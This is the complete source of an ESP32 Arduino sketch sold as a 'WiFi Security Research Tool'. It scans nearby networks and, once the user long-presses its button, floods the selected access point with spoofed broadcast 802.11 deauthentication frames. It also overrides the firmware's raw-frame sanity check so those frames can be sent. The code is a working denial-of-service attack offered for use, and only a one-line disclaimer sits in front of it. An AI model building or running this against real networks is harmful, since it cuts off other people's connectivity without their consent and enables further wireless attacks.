/*
 * -------------------------------------------------------
 * WiFi Security Research Tool V2.5 - Made By Nelson
 * -------------------------------------------------------
 * [LIST]
 * - Display: 0.96 inch OLED SSD1306 (128*64)
 * - MCU: ESP32 WROOM (Classic 30/38 Pin Dual-Core)
 * - Button: 1 (Connected to GPIO 2 and GND)
 * - Heatsink: Recommended (High PKS may cause overheating)
 * * [WIRE]
 * > OLED <
 * VCC -> 3V3 | GND -> GND | SCL -> GPIO 22 | SDA -> GPIO 21
 * * > BUTTON <
 * Pin A -> GND | Pin B -> GPIO 2
 * * [USE]
 * 1. [Scan Page]: Click to cycle targets (with scrollbar).
 * 2. [Start Attack]: Long press 1.5s to start.
 * 3. [End Attack]: Long press 1.5s to return to scan page.
 * * [COMPILATION ERROR FIX]
 * If "multiple definition of ieee80211_raw_frame_sanity_check" occurs:
 * 1. Open "platform.txt" in your ESP32 hardware folder.
 * 2. Add "-Wl,-zmuldefs" to "compiler.c.elf.flags".
 * 3. Restart Arduino IDE.
 * * [DISCLAIMER]
 * For educational and authorized security testing only.
 * The author is not responsible for any misuse or damage.
 * -------------------------------------------------------
 */

#include <Arduino.h>
#include <U8g2lib.h>
#include <WiFi.h>
#include <Wire.h>
#include "esp_wifi.h"

// --- Hardware Pins ---
#define SDA_PIN 21
#define SCL_PIN 22
#define BTN_PIN 2  

U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2(U8G2_R0, U8X8_PIN_NONE);

// --- Global Variables ---
extern "C" int ieee80211_raw_frame_sanity_check(void* frame, int len) { return 0; }

enum State { SCANNING, ATTACKING };
volatile State currentState = SCANNING;

struct AccessPoint {
  uint8_t bssid[6];
  String ssid;
  int ch;
};

AccessPoint apList[10]; 
int apCount = 0;
int selectedIdx = 0;
int displayStartIdx = 0; 
const int maxVisibleItems = 4; 

// Text Horizontal Scroll
int textScrollPos = 0;
unsigned long lastTextScrollTime = 0;

volatile uint32_t currentPks = 0;
volatile uint32_t pksBuffer = 0;
unsigned long lastPksReset = 0;

TaskHandle_t AttackTask;

// --- Scan Function ---
void performActiveScan() {
  apCount = 0;
  selectedIdx = 0;
  displayStartIdx = 0;
  int n = WiFi.scanNetworks(false, true, false, 120);
  int found = (n > 10) ? 10 : n;
  for (int i = 0; i < found; i++) {
    apList[i].ssid = WiFi.SSID(i);
    apList[i].ch = WiFi.channel(i);
    memcpy(apList[i].bssid, WiFi.BSSID(i), 6);
    apCount++;
  }
  WiFi.scanDelete();
}

// --- Attack Task (Core 0) ---
void attackLoop(void * pvParameters) {
  for(;;) {
    if (currentState == ATTACKING) {
      uint8_t p[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
      memcpy(&p[10], apList[selectedIdx].bssid, 6);
      memcpy(&p[16], apList[selectedIdx].bssid, 6);
      if (esp_wifi_80211_tx(WIFI_IF_AP, p, 26, true) == ESP_OK) pksBuffer++;
      delay(2); 
    } else {
      delay(100);
    }
  }
}

// --- UI Rendering ---
void updateDisplay() {
  u8g2.clearBuffer();
  
  if (currentState == SCANNING) {
    u8g2.setFont(u8g2_font_6x10_tf);
    u8g2.drawStr(0, 10, ">> TARGET LIST <<");
    u8g2.drawHLine(0, 12, 128);

    if (apCount == 0) {
      u8g2.drawStr(15, 35, "Scanning...");
    } else {
      for (int i = 0; i < maxVisibleItems; i++) {
        int currentItemIdx = displayStartIdx + i;
        if (currentItemIdx >= apCount) break;

        int yPos = 26 + (i * 12);
        String ssid = apList[currentItemIdx].ssid;
        int textWidth = u8g2.getStrWidth(ssid.c_str());

        if (currentItemIdx == selectedIdx) {
          u8g2.drawBox(0, yPos - 9, 124, 11);
          u8g2.setDrawColor(0); 
          if (textWidth > 115) {
            int maxScroll = textWidth - 100;
            if (millis() - lastTextScrollTime > 40) {
              static int dir = 1;
              textScrollPos += dir;
              if (textScrollPos > maxScroll + 10 || textScrollPos < -5) dir *= -1;
              lastTextScrollTime = millis();
            }
            u8g2.drawStr(5 - textScrollPos, yPos, ssid.c_str());
          } else {
            u8g2.drawStr(5, yPos, ssid.c_str());
          }
          u8g2.setDrawColor(1);
        } else {
          if (textWidth > 115) ssid = ssid.substring(0, 18) + "..";
          u8g2.drawStr(5, yPos, ssid.c_str());
        }
      }
      // Scrollbar Rendering
      int barHeight = 48 / apCount;
      u8g2.drawFrame(125, 15, 3, 48);
      u8g2.drawBox(125, 15 + (selectedIdx * (48 - barHeight) / (apCount - 1)), 3, barHeight);
    }
  } else {
    // Attack Page
    u8g2.setFont(u8g2_font_6x10_tf);
    u8g2.drawStr(0, 10, "STATUS: RUNNING");
    u8g2.drawStr(0, 22, apList[selectedIdx].ssid.substring(0, 20).c_str());
    u8g2.drawHLine(0, 25, 128);
    
    u8g2.setFont(u8g2_font_logisoso24_tn);
    u8g2.setCursor(10, 62); u8g2.printf("%u", currentPks);
    u8g2.setFont(u8g2_font_6x10_tf);
    u8g2.drawStr(95, 58, "PKS");
  }
  u8g2.sendBuffer();
}

void setup() {
  Serial.begin(115200);
  Wire.begin(SDA_PIN, SCL_PIN);
  u8g2.begin();
  pinMode(BTN_PIN, INPUT_PULLUP);
  
  WiFi.mode(WIFI_AP_STA);
  esp_wifi_start();
  performActiveScan();
  
  xTaskCreatePinnedToCore(attackLoop, "AttackTask", 2048, NULL, 1, &AttackTask, 0);
}

void loop() {
  unsigned long now = millis();
  static bool btnPressed = false;
  static unsigned long btnPressStartTime = 0;

  int btn = digitalRead(BTN_PIN);
  if (btn == LOW && !btnPressed) {
    btnPressStartTime = now;
    btnPressed = true;
  } else if (btn == HIGH && btnPressed) {
    unsigned long duration = now - btnPressStartTime;
    if (duration > 1500) {
      if (currentState == SCANNING && apCount > 0) {
        currentState = ATTACKING;
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_channel(apList[selectedIdx].ch, WIFI_SECOND_CHAN_NONE);
      } else {
        currentState = SCANNING;
        esp_wifi_set_promiscuous(false);
        performActiveScan();
      }
    } else if (duration > 50 && currentState == SCANNING) {
      selectedIdx = (selectedIdx + 1) % apCount;
      textScrollPos = 0; 
      
      if (selectedIdx >= displayStartIdx + maxVisibleItems) {
        displayStartIdx = selectedIdx - maxVisibleItems + 1;
      } else if (selectedIdx < displayStartIdx) {
        displayStartIdx = selectedIdx;
      }
    }
    btnPressed = false;
  }

  if (now - lastPksReset >= 1000) {
    currentPks = pksBuffer;
    pksBuffer = 0;
    lastPksReset = now;
  }
  updateDisplay();
}
